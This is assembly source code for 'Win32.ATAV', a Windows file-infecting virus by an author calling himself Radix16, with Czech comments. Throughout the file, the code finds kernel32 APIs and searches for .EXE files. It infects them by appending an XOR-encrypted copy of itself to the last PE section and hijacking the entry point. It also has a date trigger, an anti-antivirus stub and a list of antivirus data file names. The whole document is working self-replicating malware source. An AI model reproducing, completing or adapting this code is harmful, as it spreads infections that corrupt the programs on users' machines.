;-------------------------------
;Fuck Beta virus Atav by Radix16
;-------------------------------
;Tak tohle je mozna prvni verze viru Atav ,nevim to jiste protoze se mi gdesi stratila.
;Sami negdy uvidite zdrojak plne verze se hodne lisi s timhle TOHLE JE LAMME fuj!
;Uz se na toto nemuzu ani divat ,nestojito ani za popis :)
;
;Nova verze mela by obsahovat : Poly , Update Internet , Fast infection .Ring3 -> Ring0
;Takgze i nejake novinky pro svet :) ,ale jinac se presouvam i na LINUX :)))
; 
;Zatim Zdar :)


.386p
.Model Flat
jumps

.Data

db ?

extrn GetModuleHandleA :proc
extrn ExitProcess :proc

extrn MessageBoxA :proc

VirusSize equ Virus_End-Start
SizeCrypt equ Crypt_End-Crypto

include mz.inc                                  
include pe.inc                                 ;include files from Jacky Qwerty/29A
include win32api.inc
include useful.inc
;////////////////////////////M Y  C O D E ///////////////////////////////////////////////////////
.Code
				Virus_Size equ Virus_End-Start

Start:
	pushad	
	@SEH_SetupFrame <jmp seh_fn>
	xchg [edx], eax                 

seh_fn:	

	call Base1
			 		
Base1:
	pop ebp
	sub ebp,offset Base1
					FirstGeneration:	
call Mutate1
			 Crypto:

Virus_Start:
	
	call Kernel?

	mov esi, ebx                 
       	mov ebx,[esi+10h]                
       	add ebx,[ebp + imagebase]	
	mov [ebp + offset f_RVA],ebx
	mov eax,[esi] 
	jz Not_Found_Kernel32
	
	mov esi,[esi]                   
       	add esi,[ebp + offset imagebase]               
       	mov edx,esi                     
       	mov ecx,[ebp+offset importsize]
       	mov eax,0    

	Jmp Get_Module_Handle

coded db 'Win32.ATAV (c)oded by Radix16[MIONS]',0	
maintext db 'Heayaaa',0
Kernel?:

	mov esi,[ebp + offset imagebase]
	cmp word ptr[esi],'ZM'
	jne GetEnd	
	
	add esi,3ch
	mov esi,[esi]
	add esi,[ebp + offset imagebase]
	push esi
	cmp word ptr [esi], 'EP'       ;Win App  PE
	jne GetEnd
	
	add esi, 28h                  
       	mov eax, [esi] 
	mov [ebp+entrypoint], eax 
	pop esi
	add esi,80h 
	mov eax,[esi] 
	mov [ebp+importvirtual],eax
	mov eax,[esi+4]
	mov [ebp+importsize],eax
	mov esi,[ebp+importvirtual]
	add esi,[ebp + offset imagebase]
	mov ebx,esi
	mov edx,esi
	add edx,[ebp + importsize]
Search_Kernel:	
        mov esi,[esi + 0ch]
	add esi,[ebp + offset imagebase]
	cmp [esi],swKernel32
	Je K32Found
	add ebx, 14h                  
        mov esi, ebx    
        cmp esi, edx             
        jg Not_Found_Kernel32       
        jmp Search_Kernel  

K32Found:
	ret

Not_Found_Kernel32:
	mov eax, dword ptr [esp]         
                                
find_base_loop:                       
       	cmp dword ptr [eax+0b4h], eax 
       	je Found_Adress      
       	dec eax             
       	cmp eax, 40000000h  
       	jbe assume_hardcoded     
       	jmp find_base_loop
              
assume_hardcoded:                 
      	mov eax, 0BFF70000h          
      	cmp word ptr [eax], 'ZM'       
      	je Found_Adress                       
      	mov eax, 07FFF0000h

Found_Adress:
	mov [ebp+offset Kernel32], eax     ;Mam ju :))
	mov edi, eax
	cmp word ptr [edi],'ZM'         
      	jne GetEnd 
	mov edi, [edi+3ch]                
      	add edi, [ebp+offset Kernel32]   
      	cmp word ptr [edi],'EP'
	jne GetEnd

	pushad

	mov esi,[edi+78H]                 
      	add esi,[ebp+offset Kernel32]     
      	mov [ebp+offset Export],esi       
      	add esi,10H                      
      	lodsd                            
      	mov [ebp+offset basef],eax        
      	lodsd                             
      	lodsd                              
      	mov [ebp+offset limit],eax      
      	add eax, [ebp+offset Kernel32]     
      	lodsd                            
      	add eax,[ebp+offset Kernel32]     
      	mov [ebp+offset AddFunc],eax     
      	lodsd                            
      	add eax, [ebp+offset Kernel32]   
      	mov [ebp+offset AddName],eax     
      	lodsd                              
      	add eax,[ebp+offset Kernel32]     
      	mov [ebp+offset AddOrd],eax     
      	mov esi,[ebp+offset AddFunc]      
      	lodsd                              
	add eax,[ebp+offset Kernel32]
	
	mov esi, [ebp+offset AddName]    
      	mov [ebp+offset Nindex], esi      
      	mov edi,[esi]                    
      	add edi,[ebp+offset Kernel32]    
      	mov ecx,0                        
      	mov ebx,offset API_NAMES          
      	add ebx,ebp   

TryAgain:                               
      	mov esi,ebx  
MatchByte:                               
      	cmpsb                             
      	jne NextOne                     
                                        
      	cmp byte ptr [edi], 0             
      	je GotIt                          
      	jmp MatchByte                     
                                         
NextOne:                                 
     	inc cx                              
     	cmp cx, word ptr [ebp+offset limit] 
     	jge GetEnd

	add dword ptr [ebp+offset Nindex], 4
     	mov esi, [ebp+offset Nindex]        
     	mov edi, [esi]                     
     	add edi, [ebp+offset Kernel32]      
     	jmp TryAgain 

GotIt:
      	mov ebx,esi                    
      	inc ebx                          
      	shl ecx,1  

	mov esi, [ebp+offset AddOrd]     
      	add esi,ecx                     
      	xor eax,eax                    
      	mov ax,word ptr [esi]         
      	shl eax, 2                      
      	mov esi,[ebp+offset AddFunc]     
      	add esi,eax                      
      	mov edi,dword ptr [esi]         
      	add edi,[ebp+offset Kernel32]   

       	mov [ebp+offset ddGetProcAddress], edi  
      	popad                                
	
	mov esi, offset swExitProcess      
      	mov edi, offset ddExitProcess     
      	add esi, ebp                     
      	add edi, ebp

Repeat_find_apis:                      
      	push esi                       
      	mov eax,[ebp+offset Kernel32]    
      	push eax                          
      	mov eax,[ebp+offset ddGetProcAddress]
      	call eax                         
      	cmp eax,0                       
      	je GetEnd                        
      	stosd                          
                                      
repeat_inc:                           
      	inc esi                         
      	cmp byte ptr [esi], 0             
      	jne repeat_inc                    
      	inc esi                          
      	cmp byte ptr [esi], 0FAh         
      	jne Repeat_find_apis          
 
	Jmp Virus_Game	
      
Get_Module_Handle:
	cmp dword ptr [edx],0             
      	je  Not_Found_Kernel32                     
      	cmp byte ptr [edx+3],80h
	je Not_Here 
	mov esi,[edx]                     
      	push ecx                         
      	add esi,[ebp + offset imagebase]               
      	add esi,2	
	mov edi,offset gmhGetModuleHandleA              
      	add edi,ebp                       
      	mov ecx,gmhsize          
      	rep cmpsb                        
      	pop ecx       
	je  f_GetModuleHandelA
Not_Here:
	inc eax                          
      	add edx,4                       
      	loop Get_Module_Handle
	jmp Not_Found_Kernel32
f_GetModuleHandelA:
	shl eax,2                        
      	mov ebx,[ebp+offset f_RVA]  
      	add eax,ebx                     
      	mov eax,[eax]                   

      	mov edx,offset se_Kernel32	            
      	add edx,ebp                    
      	push edx                          
      	call eax                         
      	cmp eax,0	
	jne Found_Adress
	Jmp Not_Found_Kernel32


Virus_Game:
	push offset SystemTime
	mov eax,[ebp + ddGetSystemTime]
	call eax 

	cmp byte ptr [SystemTime.wMonth],0Ah
	jne Next_Game
	cmp byte ptr [SystemTime.wDay],0Fh
	jne Next_Game
	
	jmp Ok_Day_Month

Next_Game:
	mov dword ptr [ebp+offset infections], 0Ah
	   
	call SearchFiles
	inc eax
	jz GetEnd
	dec eax
	push eax
	mov ecx,[edi.FileSizeLow] ;zisti velikost souboru
	lea esi,[edi.FileName]         
	call Infect
	jc _try 
      	dec dword ptr [ebp+offset infections]
      	cmp word ptr [ebp+offset infections], 0
      	je All_Done  
_try:	
	push edi      
      	lea edi, [edi.FileName] 
      	mov ecx, 13d
      	mov al, 0  
      	rep stosb 
      	pop edi 
      	pop eax
      	push eax 
      	push edi
      	push eax 
      	call dword ptr [ebp+offset ddFindNextFileA]
	test eax,eax 
      	jz All_Done
	mov ecx,[edi.FileSizeLow] ;zisti velikost souboru
	lea esi,[edi.FileName]    
	call Infect
	jc failinfection   
        dec dword ptr [ebp+infections]  
failinfection:                        
      	cmp dword ptr [ebp+infections], 0  
      	jne _try 

All_Done:
	pop eax
GetEnd:
	cmp ebp, 0                        
      	je _exit                       
      	mov eax,[ebp + offset oldip]       
      	add eax,[ebp + offset imagebase]                
      	jmp eax
_exit:                              
      	push 0                          
      	mov eax, [ebp+offset ddExitProcess]
      	call eax 
	
	

PEheader dd 0    
oldip dd 0
oldsize dd 0 
newsize dd 0                
incsize dd 0
newip dd 0

Infect  proc	
	
	pushad
	add ecx,VirusSize ;pricti virus k souboru
	mov word ptr [ebp+infectionflag], 0 
	mov [ebp + offset memory],ecx ; nastav max velikost pro mapovani souboru
	call OpenFile                 ;volej funkci pro otevreni souboru
	mov [ebp+offset filehandle], eax ; 
	inc eax                    ; eax -1
	jz Endus		    ; chyba? jestli ne tak jed dal	
	call CMapFile
	or eax,eax
	jz Endus
	call MapView
	or eax,eax
	jz Exit_Map
	mov esi,eax
	mov [ebp+offset mapaddress],esi
	
	cmp word ptr[esi],'ZM'    ;Zacina typickymi znaky jako EXE
	jne UnMapw
		
	
	mov ebx,dword ptr[esi+3ch]
	cmp word ptr [esi+ebx],'EP'	;Je to PE
	jne UnMapw
	add esi,ebx
	mov [PEheader+ebp], esi
	mov eax, [esi+28h]
	mov [oldip+ebp],eax      ;Uloz skok
	mov eax,[esi+3ch]	
	push eax 
	xor eax, eax
	mov ebx,[esi+74h]
	shl ebx,3  
	mov ax,word ptr [esi+6h]
	dec eax
	mov ecx,28h             
      	mul ecx 
	add esi,78h 
      	add esi,ebx 
      	add esi,eax
	
	or dword ptr ds:[esi+24h],0A0000020h
	
	mov eax,[esi+10h]
	mov [oldsize+ebp],eax
	add dword ptr [esi+8h],VirusSize

	mov eax,[esi+8h]
	pop ebx
	mov ecx,ebx
	div ecx
	mov ecx,ebx
	sub ecx,edx
	mov [esi+10h],ecx
	mov eax,[esi+8h] 
	add eax,[esi+10h]
      	mov [esi+10h],eax
	mov [ebp+offset newsize], eax 

	mov eax,[esi+0ch]               
      	add eax,[esi+8h]                 
      	sub eax,VirusSize                      
      	mov [newip+ebp],eax

	mov eax,[ebp+offset oldsize]    
      	mov ebx,[ebp+offset newsize]       
      	sub ebx,eax                          
      	mov [ebp+offset incsize], ebx       
                                             
      	mov eax,[esi+14h]                  
      	add eax,[ebp+offset newsize]      
      	mov [ebp+offset newfilesize], eax
	
	mov eax, [esi+14h]                    
      	add eax,[esi+8h]                   
      	sub eax,VirusSize                     
      	add eax,[ebp+offset mapaddress]      
                                           
      	call Write_File
		
	mov esi,[ebp+offset PEheader]
	mov eax,[newip+ebp]
	mov [esi+28h],eax 
	mov eax, [ebp+offset incsize]  
      	add [esi+50h], eax 

UnMapw:
	push dword ptr [ebp+offset mapaddress] 
      	mov eax, [ddUnmapViewOfFile+ebp]      
      	Call eax
	
Exit_Map:
	push dword ptr [ebp+offset maphandle]
	mov eax,[ddCloseHandle+ebp]
	call eax	
	
	push dword ptr [ebp+offset filehandle]
      	mov eax, [ddCloseHandle+ebp]         
      	call eax  
	Jmp Complete?
infection_error:
	stc
      	jmp Endus  
Complete?:
	cmp word ptr [ebp+offset infectionflag], 0FFh
      	je infection_error
	clc   
	
Endus:
	popad
	ret
Infect endp



SearchFilesN proc
	
    	ret
SearchFilesN endp

SearchFiles proc
	lea edi,[ebp + offset search]
      	mov eax,edi 
      	push eax
      	lea eax,[ebp + offset _Exe]
      	push eax
      	call dword ptr[ebp+offset ddFindFirstFileA]	    
	ret
SearchFiles endp

memory dd 0
maphandle dd 0
mapaddress dd 0

CMapFile proc
	push 0
        push dword ptr [ebp+offset memory]  ; max.velikost
        push 0
        push PAGE_READWRITE  ;R/W
	push 0
	push dword ptr [ebp+offset filehandle]  ;handle
	mov eax,dword ptr [ddCreateFileMappingA+ebp]
	call eax
	mov [ebp+offset maphandle], eax  ;uloz map.handle
	ret
CMapFile endp

MapView proc
	push dword ptr [ebp+offset memory]
 	push 0
        push 0
        push FILE_MAP_ALL_ACCESS
        push eax 
 	mov eax,[ddMapViewOfFile+ebp]  
      	call eax
	ret                     
MapView endp

filehandle dd 0     ;rukojet souboru

OpenFile proc
	push 0           ;Atributy                    
	push 0                               
      	push 3           ;Otevri existuji soubor                
      	push 0                               
      	push 1                             
      	push 80000000h or 40000000h          ;read a write
      	push esi                             ;jmeno souboru
      	mov eax, [ddCreateFileA+ebp]   ;
      	Call eax                          ;volej
	ret		;zpet
OpenFile endp   ;v eax je rukojet souboru


Kick_AV proc
	push eax                   
        cdq                            
        push edx                     
;            call FindWindowA              
        xchg eax, ecx                
        jecxz quit                    

        push edx                    
        push edx                      
        push 12h                       
        push ecx                       
;       call PostMessageA               
quit:
	ret

Kick_AV endp


Delete_AV proc



Delete_AV endp



Ok_Day_Month:
	


;////////////////D A T A ////////////////////////////////////////////////////////////////////////



	nop
	imagebase dd 00400000h 
	swKernel32 = 'NREK'
	Kernel32 dd 00000000h  
	importvirtual dd ?               
	importsize dd ?     
	entrypoint dd ?
	f_RVA dd ?
	Nindex dd 0   
	basef dd 0
	Export dd 0
	limit dd 0
	
	AddFunc dd 0                  
	AddName dd 0                    
	AddOrd dd 0     
	 
	                 
	             
	newfilesize dd 0               
	
	infectionflag dw 0
	gmhGetModuleHandleA db 'GetModuleHandleA',0
	gmhsize = $-gmhGetModuleHandleA

API_NAMES:
	swGetProcAddress db 'GetProcAddress',0        
	swExitProcess db 'ExitProcess',0         
	swGetVersion db 'GetVersion',0
	swFindFirstFileA db 'FindFirstFileA',0        
	swFindNextFileA db 'FindNextFileA',0        
	swGetCurrentDirectory db 'GetCurrentDirectoryA',0 
	swSetCurrentDirectory db 'SetCurrentDirectoryA',0
	swDeleteFile db 'DeleteFileA',0
	swCreateFileMapping db 'CreateFileMappingA',0    
	swMapViewOfFile db 'MapViewOfFile',0         
	swUnmapViewOfFile db 'UnmapViewOfFile',0      
	swGetFileAttributes db 'GetFileAttributesA',0   
	swSetFileAttributes db 'SetFileAttributesA',0    
	swGetDriveType db 'GetDriveTypeA',0        
	swCreateFile db 'CreateFileA',0          
	swCloseHandle db 'CloseHandle',0           
	swGetFileTime db 'GetFileTime',0         
	swSetFileTime db 'SetFileTime',0         
	swSetFilePointer db 'SetFilePointer',0        
	swGetFileSize db 'GetFileSize',0         
	swSetEndOfFile db 'SetEndOfFile',0         
	swGetSystemTime db 'GetSystemTime',0        
	swGetModuleHandle db 'GetModuleHandleA',0 	
	swWriteFile db 'WriteFile',0
db 0FAh

	ddGetProcAddress dd 0                        
	ddExitProcess dd 0                        
	ddGetVersion dd 0
	ddFindFirstFileA dd 0                        
	ddFindNextFileA dd 0                        
	ddGetCurrentDirectoryA dd 0                        
	ddSetCurrentDirectoryA dd 0
	ddDeleteFileA dd 0
 	ddCreateFileMappingA dd 0                        
	ddMapViewOfFile dd 0                        
	ddUnmapViewOfFile dd 0                        
	ddGetFileAttributesA dd 0                        
	ddSetFileAttributesA dd 0                        
	ddGetDriveTypeA dd 0                        
	ddCreateFileA dd 0                        
	ddCloseHandle dd 0                        
	ddGetFileTime dd 0                        
	ddSetFileTime dd 0                        
	ddSetFilePointer dd 0                        
	ddGetFileSize dd 0                        
	ddSetEndOfFile dd 0                         
	ddGetSystemTime dd 0                        
	ddGetModuleHandleA dd 0  
	ddWriteFile dd 0     


max_path EQU 260                               

se_Kernel32 db 'KERNEL32.dll',0

Anti_AV:


_Grisoft db 'avg?????.dat',0
_AVP db 'AVP.CRC',0         
_TBAW db 'anti-vir.dat',0							
_MSAV db 'CHKLIST.MS',0 

     
_Kaspersky_ db 'AVP Monitor',0
_Grisoft_ db 'AVG Control Center',0	


_Exe db '*.EXE',0
infections dd 0   
                  
      
fnx dd 0



Crypt_End:
 
Mutate1:
	
	mov ecx,SizeCrypt	
	lea esi,[ebp + Crypto]
decr:
	xor dword ptr [esi],0FFh
	inc esi
	loop decr	 
End_Mutate: 
       	ret

Write_File proc
	call Mutate1 	
	mov edi, eax                          
      	lea esi,[Start+ebp]                
      	mov ecx, VirusSize                   
      	rep movsb   
	call Mutate1	
	ret
Write_File endp


Virus_End:


SYSTEMTIME struct
  
  	wYear                 WORD    ?       
  	wMonth                WORD    ?       
  	wDayOfWeek            WORD    ?     
  	wDay                  WORD    ?     
  	wHour                 WORD    ?       
  	wMinute               WORD    ?      
  	wSecond               WORD    ?     
	wMilliseconds         WORD    ?      
ends                                                

filetime                        STRUC
	FT_dwLowDateTime        DD ?
        FT_dwHighDateTime       DD ?
filetime                        ENDS 

win32_find_data                 STRUC     
        FileAttributes          DD ?        
        CreationTime            filetime ?       
        LastAccessTime          filetime ?      
        LastWriteTime           filetime ?      
        FileSizeHigh            DD ?       
        FileSizeLow             DD ?      
        Reserved0               DD ?          
        Reserved1               DD ?          
        FileName                DB max_path DUP (?) 
        AlternateFileName       DB 13 DUP (?)     
                                DB 3 DUP (?)      
win32_find_data                 ENDS            

                                                   
search	win32_find_data ?
SystemTime SYSTEMTIME <>
	
	windir db 128h dup(0)             
       	sysdir db 128h dup(0)           
       	crtdir db 128h dup(0)            

Virtual_End:



First_Gen:
pushad
call Next_Gen

Next_Gen:
pop ebp
sub ebp,offset Next_Gen

mov ecx,SizeCrypt	
lea esi,[ebp + Crypto]
decri:
xor dword ptr [esi],0FFh
inc esi
loop decri	 


push 0
push offset TextF
push offset TextF1
push 0
call MessageBoxA

popad
Jmp Start


TextF db 'Win32.ATAV by Radix16[MIONS]',0
TextF1 db 'First generation sample',0

End First_Gen
